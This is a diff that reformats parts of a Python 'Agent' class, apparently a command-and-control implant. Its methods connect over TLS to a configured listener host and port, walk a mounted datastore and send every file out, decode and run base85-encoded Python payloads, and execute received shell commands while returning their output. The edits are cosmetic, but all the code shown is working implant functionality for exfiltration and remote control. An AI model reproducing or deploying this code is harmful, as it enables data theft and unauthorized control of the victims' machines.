@@ -49,7 +49,7 @@ class Agent:
         context.set_ciphers(_AGENT_CIPHERS)
         # logging.debug("Connecting socket")
         for port in _LISTENER_PORTS:
-            #logging.debug("Attempting port: " + str(port))
+            # logging.debug("Attempting port: " + str(port))
             try:
                 sock = socket.create_connection((_LISTENER_HOST, port))
                 logging.debug("Connection to port " + str(port) + " succeeded.")
@@ -58,7 +58,7 @@ class Agent:
                 self.ssock = context.wrap_socket(sock, server_hostname=_LISTENER_HOST)
                 return True
             except:
-                #logging.debug("Connection to port " + str(port) + " was not successful.")
+                # logging.debug("Connection to port " + str(port) + " was not successful.")
                 pass
         return False
 
@@ -179,14 +179,13 @@ class Agent:
 
     def exfil_datastore(self, mountpoint):
         logging.debug("Exfiltrating datastore at " + mountpoint)
-        for path,dirs,files in os.walk(mountpoint):
+        for path, dirs, files in os.walk(mountpoint):
             for file in files:
-                filename = os.path.join(path,file)
-                relpath = os.path.relpath(filename,mountpoint)
+                filename = os.path.join(path, file)
+                relpath = os.path.relpath(filename, mountpoint)
                 filesize = os.path.getsize(filename)
                 print("Transfering " + filename)
                 self.send_file(filename)
-        
 
     def send_file(self, filename):
         logging.debug("Sending file")
@@ -233,14 +232,21 @@ class Agent:
         script = base64.b85decode(payload).decode().lstrip()
         logging.debug(script)
         try:
-            process = subprocess.Popen(['python3', "-c", script],
-                                stdout=subprocess.PIPE, 
-                                stderr=subprocess.PIPE)
-            stdout, stderr = process.communicate() # TODO: Non-blocking queue for pipe communications
-            
-            if (stdout):
+            process = subprocess.Popen(
+                ["python3", "-c", script],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+            )
+            (
+                stdout,
+                stderr,
+            ) = (
+                process.communicate()
+            )  # TODO: Non-blocking queue for pipe communications
+
+            if stdout:
                 self.respond(stdout.decode(), "STDOUT")
-            if (stderr):
+            if stderr:
                 self.respond(stderr.decode(), "STDERR")
 
         except Exception as e:
@@ -253,9 +259,9 @@ class Agent:
         stdout = None
         stderr = None
         try:
-            process = subprocess.Popen(command.split(),
-                                    stdout=subprocess.PIPE, 
-                                    stderr=subprocess.PIPE)
+            process = subprocess.Popen(
+                command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE
+            )
             stdout, stderr = process.communicate()
             stdout = stdout.decode()
             stderr = stderr.decode()
@@ -263,10 +269,10 @@ class Agent:
             stderr = "No such file or directory"
         except PermissionError:
             stderr = "Permission denied"
-        
-        if (stdout):
+
+        if stdout:
             self.respond(stdout, "STDOUT")
-        if (stderr):
+        if stderr:
             self.respond(stderr, "STDERR")
 
     def run_task(self, task):
